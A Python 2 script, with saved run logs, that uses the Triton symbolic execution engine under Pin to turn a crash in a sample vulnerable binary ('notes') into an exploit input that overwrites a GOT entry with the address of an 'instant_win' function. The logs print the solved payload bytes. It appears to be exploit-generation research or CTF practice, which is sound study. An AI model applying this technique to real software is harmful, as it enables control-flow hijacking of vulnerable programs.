#!/usr/bin/env python2
## -*- coding: utf-8 -*-

_ = """
export CRASHED_AT='0x00007ffff7a8c231'  ### value is just example
time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes.py vuln-samples/notes < vuln-samples/crash-inputs/notes-1
"""

import os, sys
from triton  import *
from pintool import *
import lief
import time

isRead = None
Triton = getTritonContext()
crash_inputs = []
mc = None
mnode = None

def solve():
    global Triton
    global crash_inputs
    global mc
    global mnode
    global elf

    found = False
    inputs = ['\0'] * 1024
    astCtxt = Triton.getAstContext()

    try:
        if True:
            pc = Triton.getPathConstraintsAst()
            print '[TT] Solving Path constraint...'
            models = Triton.getModels(pc, 1)
            if len(models) == 0:
                print '[TT] Model for Path Constraint: unsat'
            else:
                print '\tFound %d models' % len(models)
            for i, m in enumerate(models):
                print '[TT] Model #%d for Path Constraint:' % i, m
                for k, v in m.items():
                    inputs[k] = chr(v.getValue())

        if mc is not None and mnode is not None:
            print '\tmc:', mc
            print '\tmnode:', mnode
            print '\tmc.evaluate() = %#x' % mc.evaluate()
            print '\tmc.getBitvectorSize() = %d' % mc.getBitvectorSize()
            print '\tmnode.getBitvectorSize() = %d' % mnode.getBitvectorSize()
            print '[TT] Solving Memory Access constriant...'
            m = Triton.getModel(
                    astCtxt.land([
                        astCtxt.equal(mc, astCtxt.bv(elf.get_symbol('got').value + 3 * 8, CPUSIZE.QWORD_BIT)), # GOT Table
                        astCtxt.equal(mnode, astCtxt.bv(elf.get_symbol('instant_win').value & 0xff, CPUSIZE.BYTE_BIT)), # instant_win() = 0x4008b2
                    ])
                )
            if len(m) > 0:
                found = True
                print '[TT] Model for Memory Access:', m
                for k, v in m.items():
                    inputs[k] = chr(v.getValue())
                    crash_inputs[k] = chr(v.getValue())
            else:
                print '[TT] Model for Memory Access: unsat'

        if found:
            print '~' * 8

            ### Review result
            print 'Found exploitable crash: ', '%r' % ''.join(inputs).strip('\0')
            print 'Crash inputs: %r' % ''.join(crash_inputs)

            ### Save result for next phase
            print('[TT] Reading remaining stdin...')
            res = sys.stdin.read(1024)
            print "\tread stdin = '%r'" % res
            crash_inputs += list(res)
            RESULT_FILE = 'crash_inputs'
            with open(RESULT_FILE, 'wb') as f:
                f.write(''.join(crash_inputs))
            print '[TT] crash input is saved as \'{}\''.format(RESULT_FILE)

            return True
        else:
            print 'not found ;('
        return False
    except Exception, e:
        print "Exception: ", e
        exit()


def syscallsEntry(threadId, std):
    global isOpen
    global isRead
    global targetFd

    if getSyscallNumber(std) == SYSCALL64.READ:
        fd   = getSyscallArgument(std, 0)
        buff = getSyscallArgument(std, 1)
        size = getSyscallArgument(std, 2)
        if fd == 0:
            isRead = {'buff': buff, 'size': size}

    return

stdin_len = 0
def syscallsExit(threadId, std):
    global isOpen
    global isRead
    global targetFd
    global stdin_len
    global concrete_input_offets

    ctxt = getTritonContext()

    if isRead is not None:
        size = isRead['size']
        buff = isRead['buff']
        print '\n[TT] Symbolizing stdin (buf=%#x, size=%d)' % (buff, size)
        for index in range(size):
            if not checkReadAccess(buff + index):
                print "[TT] Detected memory access violation"
                found = solve()
                if found:
                    print "[TT] Go on to phase 2"
                    exit()

            print '\tread: %r' % chr(getCurrentMemoryValue(buff+index))
            crash_inputs.append(chr(getCurrentMemoryValue(buff+index))) ### log stdin

            start_time = time.time()
            ### Symbolize input
            ctxt.setConcreteMemoryValue(buff+index, getCurrentMemoryValue(buff+index)) ### Triton's manner
            print "\tSymbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### makes slower
            ### Concretize part of stdin
            if stdin_len in concrete_input_offets:
                print "\tConcretized stdin pos %d" % stdin_len
                ctxt.concretizeMemory(MemoryAccess(buff+index, CPUSIZE.BYTE))
            end_time = time.time()
            print '\tSymbolize took %f sec' % (end_time - start_time)

            stdin_len += 1
        isRead = None

    return


def mycb(inst):
    global mc
    global mnode
    global crashed_at

    # if inst.isControlFlow():
    #     print inst
    if (inst.getAddress() & 0xfff) == (crashed_at & 0xfff):
        if inst.isMemoryWrite() and Triton.getPathConstraintsAst().isSymbolized():
            mem, node = inst.getStoreAccess()[0]
            if (mem.getLeaAst() is not None):
                print inst
                mc = mem.getLeaAst()
                mnode = node
                # print 'Path Constraint: %s' % str(pc)
                # print 'MemoryAccess LeaAst: %s' % str(mem.getLeaAst())
            if not checkWriteAccess(mem.getAddress()):
                print "[TT] Detected memory access violation"
                found = solve()
                if found:
                    print "[TT] Go on to phase 2"
                    exit()

    return

def signals(threadId, sig):
    print '[!] Signal %d received on thread %d.' % (sig, threadId)

    # found = solve()
    # if found:
    #     print "[TT] Go on to phase 2"
    #     exit()


if __name__ == '__main__':

    ### Define symbolic optimizations
    Triton.enableMode(MODE.ALIGNED_MEMORY, True) ### **REQUIRED** (slowns, but nor leaAst becomes bvtrue)
    Triton.enableMode(MODE.ONLY_ON_SYMBOLIZED, True) ### **REQUIRED**

    startAnalysisFromSymbol('main')

    ### Enforce concrete execution on partial of stdin
    # concrete_input_offets = range(40)
    concrete_input_offets = range(0)

    ### Set the address where crash occurs
    if 'CRASHED_AT' in os.environ:
        crashed_at = int(os.environ['CRASHED_AT'], 16)
        print '[TT] reported that the program was crashed at {:#x}'.format(crashed_at)
    else:
        print '[TT] set value to environment variable \'CRASHED_AT\' which is the address where the crash occurs'
        exit()

    ### Gather information from ELF
    for i, x in enumerate(sys.argv):
        if '.py' in x:
            argv = sys.argv[i + 2:] ### skip script name and param '--'
    elf = lief.parse(argv[0])
    print '[TT] Symbol address info:'
    print '\tgot = {:#x}'.format(elf.get_symbol('got').value)
    print '\tinstant_win = {:#x}'.format(elf.get_symbol('instant_win').value)

    ### Add callback
    insertCall(mycb, INSERT_POINT.BEFORE)
    insertCall(signals, INSERT_POINT.SIGNALS) # wait for SIGSEGV

    insertCall(syscallsEntry, INSERT_POINT.SYSCALL_ENTRY)
    insertCall(syscallsExit,  INSERT_POINT.SYSCALL_EXIT)

    ### Run Program
    runProgram()


"""
0x7fdf91bab231: mov byte ptr [rbp], al

signals()
7
[TT] Solving Path constriant...
[TT] Model for Path Constraint: {0L: SymVar_0 = 0x6E, 2L: SymVar_2 = 0xF5, 3L: SymVar_3 = 0xF5, 4L: SymVar_4 = 0xF5, 5L: SymVar_5 = 0xA, 6L: SymVar_6 = 0xF5, 7L: SymVar_7 = 0xF5, 8L: SymVar_8 = 0xF5, 9L: SymVar_9 = 0xA, 10L: SymVar_10 = 0x6E, 12L: SymVar_12 = 0xF5, 13L: SymVar_13 = 0xF5, 14L: SymVar_14 = 0xF5, 15L: SymVar_15 = 0xF5, 16L: SymVar_16 = 0xA, 17L: SymVar_17 = 0xF5, 18L: SymVar_18 = 0xF5, 19L: SymVar_19 = 0xF5, 20L: SymVar_20 = 0xF5, 21L: SymVar_21 = 0xA, 22L: SymVar_22 = 0x75, 24L: SymVar_24 = 0x38, 25L: SymVar_25 = 0x3A, 26L: SymVar_26 = 0xF5, 27L: SymVar_27 = 0xF5, 28L: SymVar_28 = 0xF5, 29L: SymVar_29 = 0xF5, 30L: SymVar_30 = 0xF5, 31L: SymVar_31 = 0xF5, 32L: SymVar_32 = 0xF5, 33L: SymVar_33 = 0xF5, 34L: SymVar_34 = 0xF5, 35L: SymVar_35 = 0xF5, 36L: SymVar_36 = 0xF5, 37L: SymVar_37 = 0xF5, 38L: SymVar_38 = 0xF5, 39L: SymVar_39 = 0xF5, 40L: SymVar_40 = 0xF5, 41L: SymVar_41 = 0xF5, 42L: SymVar_42 = 0x80, 43L: SymVar_43 = 0x0, 44L: SymVar_44 = 0x0, 45L: SymVar_45 = 0x0, 46L: SymVar_46 = 0x0, 47L: SymVar_47 = 0x0, 48L: SymVar_48 = 0x0, 49L: SymVar_49 = 0x0, 50L: SymVar_50 = 0xF5, 51L: SymVar_51 = 0xF5, 52L: SymVar_52 = 0xF5, 53L: SymVar_53 = 0xF5, 54L: SymVar_54 = 0xF5, 55L: SymVar_55 = 0xF5, 56L: SymVar_56 = 0xF5, 57L: SymVar_57 = 0xF5, 58L: SymVar_58 = 0xA, 59L: SymVar_59 = 0xF5, 60L: SymVar_60 = 0xF5, 61L: SymVar_61 = 0xF5, 62L: SymVar_62 = 0xF5, 63L: SymVar_63 = 0xF5, 64L: SymVar_64 = 0xA, 65L: SymVar_65 = 0x75, 67L: SymVar_67 = 0x31, 68L: SymVar_68 = 0x3A, 69L: SymVar_69 = 0xF5, 70L: SymVar_70 = 0xF5, 71L: SymVar_71 = 0xF5, 72L: SymVar_72 = 0xF5, 73L: SymVar_73 = 0xF5, 74L: SymVar_74 = 0xA, 75L: SymVar_75 = 0xF5}
mc: (bvadd ref!452530 (bvadd (bvmul (_ bv0 64) (_ bv1 64)) (_ bv0 64)))
mnode: ((_ extract 7 0) ref!452517)
mc.evaluate() = 0x41412d4141434141
mc.getBitvectorSize() = 64
mnode.getBitvectorSize() = 8
[TT] Solving Memory Access constriant...
[TT] Model for Memory Access: {75L: SymVar_75 = 0xB0, 42L: SymVar_42 = 0x60, 43L: SymVar_43 = 0x20, 44L: SymVar_44 = 0x60, 45L: SymVar_45 = 0x0, 46L: SymVar_46 = 0x0, 47L: SymVar_47 = 0x0, 48L: SymVar_48 = 0x0, 49L: SymVar_49 = 0x0}
Found: 
['n', '\x00', '\xf5', '\xf5', '\xf5', '\n', '\xf5', '\xf5', '\xf5', '\n', 'n', '\x00', '\xf5', '\xf5', '\xf5', '\xf5', '\n', '\xf5', '\xf5', '\xf5', '\xf5', '\n', 'u', '\x00', '8', ':', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '`', ' ', '`', '\x00', '\x00', '\x00', '\x00', '\x00', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\n', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\n', 'u', '\x00', '1', ':', '\xf5', '\xf5', '\xf5', '\xf5', '\xf5', '\n', '\xb0', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00']
'n\x00\xf5\xf5\xf5\n\xf5\xf5\xf5\nn\x00\xf5\xf5\xf5\xf5\n\xf5\xf5\xf5\xf5\nu\x008:\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5` `\x00\x00\x00\x00\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\xf5\xf5\xf5\xf5\xf5\nu\x001:\xf5\xf5\xf5\xf5\xf5\n\xb0'
['n', '\n', 't', 'i', 't', '\n', 'c', 'o', 'n', '\n', 'n', '\n', 't', 'i', 't', '!', '\n', 'c', 'o', 'n', '!', '\n', 'u', '\n', '1', '\n', 'A', 'A', 'A', '%', 'A', 'A', 's', 'A', 'A', 'B', 'A', 'A', '$', 'A', 'A', 'n', '`', ' ', '`', '\x00', '\x00', '\x00', '\x00', '\x00', '(', 'A', 'A', 'D', 'A', 'A', ';', 'A', '\n', 'c', 'o', 'n', '!', '!', '\n', 'u', '\n', '2', '\n', 't', 'i', 't', '!', '!', '\n', '\xb0']
'n\ntit\ncon\nn\ntit!\ncon!\nu\n1\nAAA%AAsAABAA$AAn` `\x00\x00\x00\x00\x00(AADAA;A\ncon!!\nu\n2\ntit!!\n\xb0'
~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  1630.75s user 6.39s system 99% cpu 27:27.10 total
K_atc% 

### concrete_input_offets = range(0)
------
[TT] Detected memory access violation
[TT] Solving Path constriant...
    Found 1 models
[TT] Model #0 for Path Constraint: {40L: SymVar_40 = 0xF5, 41L: SymVar_41 = 0xF5, 42L: SymVar_42 = 0x0, 43L: SymVar_43 = 0x0, 44L: SymVar_44 = 0x0, 45L: SymVar_45 = 0x0, 46L: SymVar_46 = 0x0, 47L: SymVar_47 = 0x0, 48L: SymVar_48 = 0x8, 49L: SymVar_49 = 0x0, 50L: SymVar_50 = 0xA, 51L: SymVar_51 = 0xF5, 52L: SymVar_52 = 0xF5, 53L: SymVar_53 = 0xF5, 54L: SymVar_54 = 0xF5, 55L: SymVar_55 = 0xF5, 56L: SymVar_56 = 0xA, 57L: SymVar_57 = 0x75, 59L: SymVar_59 = 0x34, 60L: SymVar_60 = 0xB0, 61L: SymVar_61 = 0xF5, 62L: SymVar_62 = 0xF5, 63L: SymVar_63 = 0xF5, 64L: SymVar_64 = 0xF5, 65L: SymVar_65 = 0xF5, 66L: SymVar_66 = 0xA, 67L: SymVar_67 = 0xF5}
mc: (bvadd ref!447501 (bvadd (bvmul (_ bv0 64) (_ bv1 64)) (_ bv0 64)))
mnode: ((_ extract 7 0) ref!447488)
mc.evaluate() = 0x41412d4141434141
mc.getBitvectorSize() = 64
mnode.getBitvectorSize() = 8
[TT] Solving Memory Access constriant...
[TT] Model for Memory Access: {67L: SymVar_67 = 0xB2, 42L: SymVar_42 = 0x78, 43L: SymVar_43 = 0x20, 44L: SymVar_44 = 0x60, 45L: SymVar_45 = 0x0, 46L: SymVar_46 = 0x0, 47L: SymVar_47 = 0x0, 48L: SymVar_48 = 0x0, 49L: SymVar_49 = 0x0}
Found: 
'\xf5\xf5x `\x00\x00\x00\x00\x00\n\xf5\xf5\xf5\xf5\xf5\nu\x004\xb0\xf5\xf5\xf5\xf5\xf5\n\xb2'
Crash Inputs: 'n\ntit\ncon\nn\ntit!\ncon!\nu\n1\nAAA%AAsAABAA$AAnx `\x00\x00\x00\x00\x00\ncon!!\nu\n2\ntit!!\n\xb2'
[TT] Reading remaining stdin...
    read stdin = ''rashcrash\n''
[TT] Go on to phase 2
~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  18.71s user 2.01s system 99% cpu 20.756 total
------

### concrete_input_offets = range(0)
------
[TT] Solving Memory Access constriant...
[TT] Model for Memory Access: {64L: SymVar_64 = 0x60, 65L: SymVar_65 = 0x0, 66L: SymVar_66 = 0x0, 67L: SymVar_67 = 0x0, 68L: SymVar_68 = 0x0, 69L: SymVar_69 = 0x0, 95L: SymVar_95 = 0x10, 62L: SymVar_62 = 0xD8, 63L: SymVar_63 = 0x30}
~~~~~~~~
Found exploitable crash:  'n\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\xf5\nu\x009:n\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\xf5\xf5\xf5\xf5\xf5\xf5\n\xf8\x00n\x00\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xd80`\x00\x00\x00\x00\x00\xf5\xf5\xf5\xf5\n\xf5\nu\x001:\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\n\x10'
Crash inputs: 'n\xf8]it\xe9m\r2\ns\nu\n3\nnle\xffh\xff\xffo\x81!!.z\x81!! \xd5\ncnn! \xd5\ncnnf\xad\xad\xad\xadf\xad\xad\xad\xad\xad\xad\xad\xad"\xad\xad\xd80`\x00\x00\x00\x00\x00\xad\xad\rQ\ns\nu\n3\nnle\xff(\xff\xffo\x81!! \xd5\n\x10'
[TT] Reading remaining stdin...
    read stdin = ''nnnnn\x81\xe1nnnnn~nnon!\xff\x00s\nq''
[TT] crash input is saved as 'crash_inputs'
[TT] Go on to phase 2
~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  106.72s user 5.79s system 99% cpu 1:53.21 total
-----
"""